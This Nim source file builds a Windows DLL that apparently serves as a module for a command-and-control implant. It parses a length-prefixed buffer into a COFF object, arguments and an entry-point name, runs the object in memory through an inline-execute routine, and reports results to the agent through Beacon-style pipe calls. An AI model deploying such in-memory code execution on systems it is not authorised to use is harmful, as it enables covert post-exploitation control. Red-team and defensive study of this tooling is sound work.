import winim/lean
import ./[beacon, coff]

proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL
             {.stdcall, exportc, dynlib.} =
    return TRUE

proc parseArguments(args: PBYTE, argsLen: DWORD): tuple[obj: PBYTE, objLen: DWORD, objArgs: PBYTE, objArgsLen: DWORD, entryFunc: string] =
    if args == nil or argsLen < 12:
        return

    var curr = cast[uint](args)
    let limit = curr + cast[uint](argsLen)

    template getUint32(): uint32 =
        if curr + 4 > limit: 
            return
        let value = cast[ptr uint32](curr)[]
        curr += 4
        value

    template getDataWithLengthPrefix(len: uint32): PBYTE =
        if curr + cast[uint](len) > limit: 
            return
        let value = cast[PBYTE](curr)
        curr += cast[uint](len)
        value

    let bofLen = getUint32()
    result.obj = getDataWithLengthPrefix(bofLen)
    result.objLen = cast[DWORD](bofLen)

    let bofArgsLen = getUint32()
    result.objArgs = getDataWithLengthPrefix(bofArgsLen)
    result.objArgsLen = cast[DWORD](bofArgsLen)

    let entryFuncLen = getUint32()
    let entryFuncPtr = getDataWithLengthPrefix(entryFuncLen)
    result.entryFunc = newString(entryFuncLen)
    copyMem(addr result.entryFunc[0], entryFuncPtr, entryFuncLen)

proc Run(args: PBYTE, argsLen: DWORD, hWrite, hWakeup, hStop: HANDLE): BOOL {.stdcall, exportc, dynlib.} =
    NimMain()

    gOutputPipe = hWrite
    gWakeupEvent = hWakeup
    gStopEvent = hStop

    let (obj, objLen, objArgs, objArgsLen, entryFunc) = parseArguments(args, argsLen)
    try:
        inlineExecute(obj, objLen, objArgs, objArgsLen, entryFunc)
    
    except CatchableError as err:
        # Write error message to pipe and wakeup agent
        BeaconPrintf(CALLBACK_ERROR, err.msg)
        BeaconWakeup()
        return FALSE

    # Flush pipe buffer 
    BeaconWakeup()
    return TRUE
